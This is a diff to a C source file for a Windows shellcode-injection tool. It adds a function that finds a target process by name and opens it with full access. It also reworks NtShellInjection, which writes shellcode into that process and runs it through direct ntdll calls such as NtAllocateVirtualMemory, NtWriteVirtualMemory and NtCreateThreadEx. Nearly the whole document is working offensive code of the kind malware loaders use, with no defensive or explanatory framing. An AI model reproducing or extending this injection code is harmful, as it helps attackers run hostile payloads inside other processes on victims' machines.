@@ -1,9 +1,73 @@
 #include "Box.h"
+#include "struct.h"
+
+BOOL GetRemoteProcID
+(
+	IN LPCWSTR ProcName,
+	OUT DWORD* PID,
+	OUT HANDLE* hProcess
+)
+
+{
+
+	fnNtQuerySystemInformation		pNtQuerySystemInformation = NULL;
+	ULONG							uReturnLen1 = 0, uReturnLen2 = 0;
+	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
+	PVOID							pValueToFree = NULL;
+	NTSTATUS						STATUS = 0;
+
+
+	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
+	if (pNtQuerySystemInformation == NULL) {
+		PRINT_ERROR("GetProcAddress");
+		return FALSE;
+	}
+
+	pNtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uReturnLen1);
+
+	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
+	if (SystemProcInfo == NULL)
+	{
+		PRINT_ERROR("HeapAlloc");
+		return FALSE;
+	}
+
+	pValueToFree = SystemProcInfo;
+
+	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
+	if (STATUS != 0x0) {
+		PRINT_ERROR("NtQuerySystemInformation");
+		return FALSE;
+	}
+
+	while (TRUE) {
+		if (SystemProcInfo->ImageName.Length && _wcsicmp(SystemProcInfo->ImageName.Buffer, ProcName) == 0)
+		{
+			*PID = (DWORD)SystemProcInfo->UniqueProcessId;
+			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
+			break;
+		}
+
+		if (!SystemProcInfo->NextEntryOffset)
+			break;
+
+		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
+
+	}
+
+	HeapFree(GetProcessHeap(), 0, pValueToFree);
+
+	if (*PID == NULL || *hProcess == NULL)
+		return FALSE;
+	else
+		return TRUE;
+}
 
 BOOL NtShellInjection(
-	_In_ CONST DWORD PID,
-	_In_ CONST PBYTE pShellcode,
-	_In_ CONST SIZE_T sSizeofShellcode
+	IN DWORD PID,
+	IN HANDLE hProcess,
+	IN PBYTE pShellcode,
+	IN SIZE_T sSizeofShellcode
 )
 
 {
@@ -23,21 +87,18 @@ BOOL NtShellInjection(
 
 
 	HMODULE ntdll = GetModuleHandleW(L"ntdll");
+	if (!ntdll)
+	{
+		PRINT_ERROR("GetModuleHandleW");
+		return FALSE;
+	}
 
 	// call these functions from ntdll.dll
-	fn_NtOpenProcess NtOpenProcess = (fn_NtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
 	fn_NtCreateThreadEx NtCreateThreadEx = (fn_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
 	fn_NtAllocateVirtualMemory NtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
 	fn_NtWriteVirtualMemory NtWriteVirtualMemory = (fn_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
 	fn_NtProtectVirtualMemory NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");
 	PFN_NtFreeVirtualMemory p_NtFreeVirtualMemory = (PFN_NtFreeVirtualMemory)GetProcAddress(ntdll, "NtFreeVirtualMemory");
-	
-	STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
-	if (STATUS_SUCCESS != STATUS)
-	{
-		WARN("NtOpenProcess Failed! With an Error: 0x%0.8x", STATUS);
-		State = FALSE; goto CLEANUP;
-	}
 
 	OKAY("[0x%p] Successfully Got a handle to the process: [%ld]", hProcess, PID);
 
